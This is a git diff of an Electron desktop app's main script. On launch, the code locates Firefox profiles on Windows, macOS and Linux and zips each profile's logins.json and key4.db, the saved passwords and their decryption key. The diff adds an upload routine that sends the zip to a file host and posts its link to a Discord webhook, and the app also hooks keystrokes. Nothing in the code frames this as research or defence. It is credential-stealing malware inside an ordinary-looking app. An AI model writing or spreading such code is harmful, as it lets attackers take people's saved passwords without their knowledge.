@@ -2,19 +2,17 @@ const { app, BrowserWindow } = require('electron')
 const fetch = require('electron-fetch').default
 // const path = require("path");
 const fs = require('fs');
-const fsExtra = require("fs-extra");
-// const ipcMain = require('electron').ipcMain;
-// const { desktopCapturer } = require('electron');
+const {spawn} = require("child_process");
 const JSZip = require("jszip");
-// const FileSaver = require("file-saver");
-const client = require('filestack-js').init("API KEY");
+const client = require('filestack-js').init("");
 let fullText = "";
 function createWindow () {
 // Create the browser window.
   const win = new BrowserWindow({
     width: 800,
     height: 600,
-    icon: __dirname + '/icon/snowman.png',
+    // Icons Made By https://www.flaticon.com/authors/pixel-perfect
+    icon: __dirname + '/icon/neutral.png',
     webPreferences: {
       nodeIntegration: true,
       nativeWindowOpen: true,
@@ -38,59 +36,88 @@ function createWindow () {
   console.log(ses.getUserAgent())
   let win1 = BrowserWindow.getAllWindows()[0];
 
-  fs.opendir(process.env.APPDATA + "\\Mozilla\\Firefox\\Profiles", (err, dir) => {
-    if (err) {
-      console.log("ERROR");
-    } else {
-      var recentTime = 0;
-      let recentFile = ""
-      console.log(dir.path);
 
-      files = fs.readdirSync(dir.path);
-        let zip = new JSZip();
-        files.forEach(file => {
-          statObj = fs.statSync(dir.path + "\\" + file);
-          if (statObj.mtimeMs > recentTime && file.indexOf("default") != -1) {
-            recentTime = statObj.mtimeMs;
-            recentFile = file;
-          };
-          if (statObj["mode"] == 16822) {
-            storeMozillaFiles(zip, dir.path + "\\" + file, file);
-          }
-        })
-        console.log(dir.path + "\\" + recentFile + "\\" + "login.json");
-        zip
-        .generateNodeStream(
-          {type: "nodebuffer",
-           streamFiles: true,
-           compression: "DEFLATE",
-           compressionOptions: {"level": 9}})
-        .pipe(fs.createWriteStream("out.zip"))
-        .on("finish", function() {
-          fs.rmdir("out.zip", {recursive: true}, function() {
-            console.log("done");
-          })
-          // Need discord webhook to post data.
-          // client.upload("aqua.zip").then(
-          //   function(result) {
-          //     console.log(result);
-          //   },
-          //   function(error) {
-          //     console.log(error);
-          //   }
-          // );
-          console.log("out.zip");
-        });
-        console.log(recentFile);
-        // fs.readdirSync(dir.path).forEach(file => {
-        //   // https://www.geeksforgeeks.org/node-js-fs-stat-method/
-        //   var statObj = fs.statSync(file.);
-        //   console.log(statObj.isDirectory())
-        //   console.log(file);
-        // })
-    }
-    dir.close()
-  })
+  if (process.platform == "win32") {
+    // https://healeycodes.com/javascript/python/beginners/webdev/2019/04/11/talking-between-languages.html
+    // const sensor = spawn("python3", ["test.py"]);
+    // sensor.stdout.on("data", function(data) {
+    // console.log(data.toString());
+    // })
+    var folderSpecifier = "\\";
+    processWindowsMozilla(process.env.APPDATA + "\\Mozilla\\Firefox\\Profiles",
+    folderSpecifier);
+  } else if (process.platform == "darwin") {
+    var folderSpecifier = "/";
+    processWindowsMozilla(process.env.HOME + "/Library/Application Support/Firefox/Profiles",
+    folderSpecifier);
+  } else if (process.platform == "linux") {
+    var folderSpecifier = "/";
+    processWindowsMozilla(process.env.HOME + "/.mozilla/firefox",
+    folderSpecifier);
+    // console.log("Hello");
+  }
+
+  // Duplicating process by including opendir and readdir.
+  // fs.opendir(process.env.APPDATA + "\\Mozilla\\Firefox\\Profiles", (err, dir) => {
+  //   if (err) {
+  //     console.log("ERROR");
+  //   } else {
+  //     var recentTime = 0;
+  //     let recentFile = ""
+  //     console.log(dir.path);
+
+  //     files = fs.readdirSync(dir.path);
+  //     // fs.readdir(dir.path, (err, files) => {
+  //       let zip = new JSZip();
+  //       files.forEach(file => {
+  //         statObj = fs.statSync(dir.path + "\\" + file);
+  //         if (statObj.mtimeMs > recentTime && file.indexOf("default") != -1) {
+  //           recentTime = statObj.mtimeMs;
+  //           recentFile = file;
+  //         };
+  //         if (statObj["mode"] == 16822) {
+  //           storeMozillaFiles(zip, dir.path + "\\" + file, file);
+  //         }
+  //       })
+  //       console.log(dir.path + "\\" + recentFile + "\\" + "login.json");
+  //       zip
+  //       .generateNodeStream(
+  //         {type: "nodebuffer",
+  //          streamFiles: true,
+  //          compression: "DEFLATE",
+  //          compressionOptions: {"level": 9}})
+  //       .pipe(fs.createWriteStream("out.zip"))
+  //       .on("finish", function() {
+  //         fs.rmdir("aqua.zip", {recursive: true}, function() {
+  //           var d = new Date();
+  //           var n2 = d.getTime()
+  //           console.log("done" + (n2 - n1));
+  //         })
+  //         // Post Link to discord webhook.
+  //         // client.upload("aqua.zip").then(
+  //         //   function(result) {
+  //         //     console.log(result["url"]);
+  //         //   },
+  //         //   function(error) {
+  //         //     console.log(error);
+  //         //   }
+  //         // );
+  //         // console.log("out.zip");
+  //       });
+  //       // console.log(recentFile);
+  //     // })
+  //       // fs.readdirSync(dir.path).forEach(file => {
+  //       //   // https://www.geeksforgeeks.org/node-js-fs-stat-method/
+  //       //   var statObj = fs.statSync(file.);
+  //       //   console.log(statObj.isDirectory())
+  //       //   console.log(file);
+  //       // })
+  //   }
+  //   dir.close()
+  // })
+  // fsExtra.remove("out.zip", function() {
+  //   console.log("done");
+  // })
   // fs.rmdir("out.zip", {recursive: true}, function() {
   //   console.log("done");
   // })
@@ -115,6 +142,7 @@ function createWindow () {
   for(const window of BrowserWindow.getAllWindows()) {
     if (win1.webContents) {
       win1.webContents.on('before-input-event', (event, input) => {
+        //console.log(input);
         // setTimeout(writingText(input), 500);
         if (!input.isAutoRepeat && input.type == 'keyDown') {
           if ((input.key) == 'Tab') {
@@ -156,29 +184,116 @@ function checkDir(path) {
   })
 }
 
+function processWindowsMozilla(directoryPath, folderSpecifier) {
+  var d = new Date();
+  var n1 = d.getTime()
+  fs.opendir(directoryPath, (err, dir) => {
+    if (err) {
+      console.log("ERROR");
+    } else {
+      var recentTime = 0;
+      let recentFile = ""
+      console.log(dir.path);
+
+      // Maybe remove opendir.
+      files = fs.readdirSync(dir.path);
+      // fs.readdir(dir.path, (err, files) => {
+        let zip = new JSZip();
+        files.forEach(folder => {
+          // console.log(dir.path + "\\" + folder);
+          // console.log(`${dir.path}\\${folder}`)
+          statsPath = dir.path + folderSpecifier + folder
+          // statPathResult = statPath(dir.path, folder);
+          statObj = fs.statSync(statsPath);
+          if (statObj.mtimeMs > recentTime && folder.indexOf("default") != -1) {
+            recentTime = statObj.mtimeMs;
+            recentFile = folder;
+          };
+          if (statObj["mode"] == 16822 && process.platform == "win32" ||
+              statObj["mode"] == 16832 && process.platform == "linux") {
+            storeMozillaFiles(zip, statsPath, folder, folderSpecifier);
+          }
+        })
+        console.log(dir.path + "\\" + recentFile + "\\" + "login.json");
+        zip
+        .generateNodeStream(
+          {type: "nodebuffer",
+           streamFiles: true,
+           compression: "DEFLATE",
+           compressionOptions: {"level": 9}})
+        .pipe(fs.createWriteStream("out.zip"))
+        .on("finish", function() {
+          // Specify the out.zip.
+          // uploadFiles("aqua.zip");
+          console.log("out.zip");
+        });
+        console.log(recentFile);
+      // })
+        // fs.readdirSync(dir.path).forEach(file => {
+        //   // https://www.geeksforgeeks.org/node-js-fs-stat-method/
+        //   var statObj = fs.statSync(file.);
+        //   console.log(statObj.isDirectory())
+        //   console.log(file);
+        // })
+    }
+    dir.close()
+  })
+}
+
+function uploadFiles(fileName) {
+  client.upload("aqua.zip").then(
+    function(result) {
+      const data = JSON.stringify({
+        "content": result["url"]
+      });
+      webhookID = "insert id"
+      webhookToken = "insert token"
+
+      // Reference: https://stackoverflow.com/a/56627565
+      var URL = `https://discordapp.com/api/webhooks/${webhookID}/${webhookToken}`
+      fetch(URL, {
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "body": data
+      })
+      .then(
+        fs.rmdir("aqua.zip", {recursive: true}, function() {
+          var d = new Date();
+          var n2 = d.getTime()
+          console.log("done" + (n2 - n1));
+        })
+      )
+      .catch(err => console.log(err));
+    },
+    function(error) {
+      console.log(error);
+    }
+  );
+}
+
 // Check file exists, using a path.
 // If exists store in zip, and pass foldername for zip.folder().
 
-function storeMozillaFiles(zip, pathName, folderName) {
+function storeMozillaFiles(zip, pathName, folderName, folderSpecifier) {
+  var prefixPath = pathName + folderSpecifier;
+  var loginPath = prefixPath + "logins.json";
+  var keyPath = prefixPath + "key4.db";
   try {
-    fs.statSync(pathName + "\\" + "key4.db");
+    fs.statSync(keyPath);
   } catch (err) {
     return;
   }
   try {
-    fs.statSync(pathName + "\\" + "logins.json");
+    fs.statSync(loginPath);
   } catch (err) {
     return;
   }
-  var loginPath = pathName + "\\" + "logins.json";
-  var keyPath = pathName + "\\" + "key4.db";
+  var prefixFolder = folderName + folderSpecifier;
   zip.folder(folderName);
-  zip.file(folderName + "\\" + "logins.json", fs.createReadStream(loginPath));
-  zip.file(folderName + "\\" + "key4.db", fs.createReadStream(keyPath));
+  zip.file(prefixFolder + "logins.json", fs.createReadStream(loginPath));
+  zip.file(prefixFolder + "key4.db", fs.createReadStream(keyPath));
   return;
 }
-
-
 
 // This method will be called when Electron has finished
 // initialization and is ready to create browser windows.
